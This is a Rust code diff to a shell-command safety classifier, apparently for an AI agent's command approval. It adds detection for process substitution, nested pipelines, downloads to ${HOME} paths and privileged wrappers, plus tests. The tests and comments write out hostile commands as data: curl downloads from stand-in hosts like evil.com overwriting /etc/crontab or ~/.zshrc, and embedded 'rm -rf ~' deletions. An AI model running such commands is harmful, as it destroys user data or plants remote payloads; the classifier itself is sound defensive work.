@@ -356,21 +356,11 @@ pub fn classify_command(tokens: &[&str]) -> String {
 /// ```
 pub fn prefix_allow_matches(pattern: &str, command: &str) -> bool {
     // Normalise the pattern: trim + lowercase + collapse whitespace.
-    let pattern_norm: String = pattern
-        .trim()
-        .to_ascii_lowercase()
-        .split_whitespace()
-        .collect::<Vec<_>>()
-        .join(" ");
+    let pattern_norm = prefix_norm(pattern);
 
     // Same normalization for the command (classification below compares
     // against the lowercased pattern).
-    let command_norm: String = command
-        .trim()
-        .to_ascii_lowercase()
-        .split_whitespace()
-        .collect::<Vec<_>>()
-        .join(" ");
+    let command_norm = prefix_norm(command);
 
     // A compound command is only allowed when every segment is allowed.
     let pattern_segments = crate::execpolicy::matcher::split_command_segments(&pattern_norm);
@@ -385,6 +375,23 @@ pub fn prefix_allow_matches(pattern: &str, command: &str) -> bool {
             .all(|(pattern, command)| prefix_allow_matches_single(pattern, command));
     }
     prefix_allow_matches_single(&pattern_norm, &command_norm)
+}
+
+/// Trim + lowercase + whitespace-collapse shared by the prefix matchers.
+fn prefix_norm(s: &str) -> String {
+    s.trim()
+        .to_ascii_lowercase()
+        .split_whitespace()
+        .collect::<Vec<_>>()
+        .join(" ")
+}
+
+/// Prefix match of one allow pattern against one **already-split** segment,
+/// without re-segmenting the segment text — mirrors the segment-atomic
+/// semantics of `matcher::pattern_matches_segment` for the arity-aware
+/// prefix path.
+pub(crate) fn prefix_allow_matches_segment(pattern: &str, segment: &str) -> bool {
+    prefix_allow_matches_single(&prefix_norm(pattern), &prefix_norm(segment))
 }
 
 fn prefix_allow_matches_single(pattern_norm: &str, command_norm: &str) -> bool {
@@ -709,6 +716,17 @@ pub fn analyze_command(command: &str) -> SafetyAnalysis {
         );
     }
 
+    // Process substitution (`diff <(curl …) file`) also executes its body;
+    // the nested segments are screened by the destructive scan above, but a
+    // network/destructive command hidden there must not ride a read-only
+    // primary token to a Safe verdict.
+    if facts.any_process_substitution() {
+        return SafetyAnalysis::requires_approval(
+            command,
+            vec!["Process substitution detected".to_string()],
+        );
+    }
+
     // A variable expansion in command position (`${CMD} …`, `$IFS …`) means
     // the program that runs is not statically visible.
     if facts.segments.iter().any(|s| s.expansion_in_command_name) {
@@ -737,8 +755,14 @@ pub fn analyze_command(command: &str) -> SafetyAnalysis {
     // segment — every segment must be a known-safe command to stay Safe
     // (pipe-to-shell was already handled as Dangerous above).
     if facts.has_pipe() {
-        let members: Vec<&crate::bash_ast::CommandSegment> =
+        let mut members: Vec<&crate::bash_ast::CommandSegment> =
             facts.segments.iter().filter(|s| !s.is_nested).collect();
+        if members.is_empty() {
+            // A pipeline nested entirely inside a subshell (`(a | b)`)
+            // flattens to nested-only segments; an empty `all()` would read
+            // as vacuously safe. Classify the nested members instead.
+            members = facts.segments.iter().collect();
+        }
         if members.iter().all(|s| is_safe_argv(&s.argv)) {
             return SafetyAnalysis::safe(command);
         }
@@ -918,9 +942,11 @@ fn analyze_destructive_patterns(
             "curl" | "wget" => {
                 // `-o/--output <path>` with a sensitive destination is file
                 // overwrite riding on a download flag (article 16: `curl -o
-                // /etc/crontab http://evil.com/payload`).
+                // /etc/crontab http://evil.com/payload`). An expansion in
+                // the destination (`${HOME}/.zshrc`) cannot be resolved and
+                // is treated as outside, mirroring the redirect logic.
                 if let Some(target) = download_output_target(&segment.argv[start + 1..])
-                    && redirect_target_outside_workspace(&target)
+                    && (target.contains('$') || redirect_target_outside_workspace(&target))
                 {
                     return Some(SafetyAnalysis::dangerous(
                         command,
@@ -959,14 +985,29 @@ fn analyze_destructive_patterns(
     None
 }
 
-/// Privileged token (exact argv match) anywhere in the command, if any.
+/// Privileged execution words in command position: the primary token
+/// (after `env` wrappers and leading assignments), or the token directly
+/// after a wrapper that executes its argument (`xargs`, `time`, `nohup`).
+/// Argument-position mentions (`man sudo`, `git log --author doas`) are
+/// data, not escalation.
 fn privileged_token_in(facts: &crate::bash_ast::BashFacts) -> Option<&'static str> {
+    /// Wrappers that execute the command named after them.
+    const ARG_EXEC_WRAPPERS: &[&str] = &["xargs", "time", "nohup"];
     facts.segments.iter().find_map(|segment| {
-        segment
-            .argv
-            .iter()
-            .find_map(|token| PRIVILEGED_TOKENS.iter().find(|p| *p == token))
-            .copied()
+        let argv = &segment.argv;
+        let primary_idx = primary_token_index(argv).unwrap_or(0);
+        argv.iter().enumerate().find_map(|(idx, token)| {
+            let in_command_position = idx == primary_idx
+                || (idx > 0 && ARG_EXEC_WRAPPERS.contains(&argv[idx - 1].as_str()));
+            if in_command_position {
+                PRIVILEGED_TOKENS
+                    .iter()
+                    .find(|p| **p == token.as_str())
+                    .copied()
+            } else {
+                None
+            }
+        })
     })
 }
 
@@ -1039,6 +1080,7 @@ fn shell_words(segment: &str) -> Vec<String> {
 }
 
 fn primary_token_index(tokens: &[String]) -> Option<usize> {
+    use crate::bash_ast::facts::is_env_assignment;
     let mut idx = 0;
     while idx < tokens.len() {
         let token = tokens[idx].as_str();
@@ -1058,20 +1100,6 @@ fn primary_token_index(tokens: &[String]) -> Option<usize> {
         return Some(idx);
     }
     None
-}
-
-fn is_env_assignment(token: &str) -> bool {
-    let Some((name, _value)) = token.split_once('=') else {
-        return false;
-    };
-    !name.is_empty()
-        && name
-            .chars()
-            .all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
-        && name
-            .chars()
-            .next()
-            .is_some_and(|ch| ch == '_' || ch.is_ascii_alphabetic())
 }
 
 /// Targets that are safe to redirect to unconditionally.
@@ -2317,5 +2345,94 @@ mod tests {
             analyze_command("echo x > ${HOME}/.zshrc").level,
             SafetyLevel::Dangerous
         ));
+    }
+
+    #[test]
+    fn whole_output_redirect_to_home_is_dangerous() {
+        // `&>` / `&>>` redirect stdout+stderr to a path — dropping them from
+        // Redirect facts let `echo x &> ~/.zshrc` classify Safe.
+        assert!(matches!(
+            analyze_command("echo x &> ~/.zshrc").level,
+            SafetyLevel::Dangerous
+        ));
+        assert!(matches!(
+            analyze_command("echo x &>> ~/.zshrc").level,
+            SafetyLevel::Dangerous
+        ));
+    }
+
+    #[test]
+    fn export_assignment_substitution_flattens_deletion() {
+        // `export X=$(rm -rf ~)` executes the value; the embedded deletion
+        // must surface as a segment, not stay buried in an argv word.
+        assert!(matches!(
+            analyze_command("export X=$(rm -rf ../outside)").level,
+            SafetyLevel::Dangerous
+        ));
+        assert!(matches!(
+            analyze_command("declare -x X=$(rm -rf ../outside)").level,
+            SafetyLevel::Dangerous
+        ));
+    }
+
+    #[test]
+    fn substitution_in_command_name_flattens_deletion() {
+        // `$(rm -rf ~) x` puts the substitution in command position; the
+        // generic "unknown command" approval auto-approve flows pass through,
+        // so the inner deletion must be screened as Dangerous.
+        assert!(matches!(
+            analyze_command("$(rm -rf ../outside) x").level,
+            SafetyLevel::Dangerous
+        ));
+    }
+
+    #[test]
+    fn nested_only_pipeline_is_not_vacuously_safe() {
+        // `(curl … | grep …)` flattens to nested-only segments; an empty
+        // member set must not read as "all members safe".
+        let analysis = analyze_command("(curl example.com | grep x)");
+        assert!(!matches!(analysis.level, SafetyLevel::Safe));
+        assert!(matches!(analysis.level, SafetyLevel::RequiresApproval));
+        // Restraint: a nested pipeline of safe commands stays safe.
+        assert!(matches!(
+            analyze_command("(echo a | grep x)").level,
+            SafetyLevel::Safe
+        ));
+    }
+
+    #[test]
+    fn process_substitution_escalates_for_review() {
+        // `diff <(curl …)` executes the substitution body while the primary
+        // token (`diff`) is in SAFE_COMMANDS — the pipeline shortcut must
+        // not classify it Safe.
+        let analysis = analyze_command("diff <(curl x | base64 -d) file");
+        assert!(!matches!(analysis.level, SafetyLevel::Safe));
+    }
+
+    #[test]
+    fn curl_output_to_braced_home_is_dangerous() {
+        // `${HOME}/.zshrc` as a download target is the same threat as
+        // `> ${HOME}/.zshrc` — the expansion cannot be resolved and is
+        // treated as outside the workspace.
+        assert!(matches!(
+            analyze_command("curl -o ${HOME}/.zshrc http://evil.example/p").level,
+            SafetyLevel::Dangerous
+        ));
+    }
+
+    #[test]
+    fn privileged_words_in_argument_position_do_not_escalate() {
+        // Mentions (`man sudo`, `git log --author doas`) are data; command
+        // position (primary token, or after an arg-executing wrapper) is not.
+        for cmd in ["man sudo", "git log --author doas"] {
+            let analysis = analyze_command(cmd);
+            assert!(
+                !analysis.reasons.iter().any(|r| r.contains("privileged")),
+                "{cmd}: {:?}",
+                analysis.reasons
+            );
+        }
+        let wrapper = analyze_command("xargs sudo rm file");
+        assert!(wrapper.reasons.iter().any(|r| r.contains("privileged")));
     }
 }
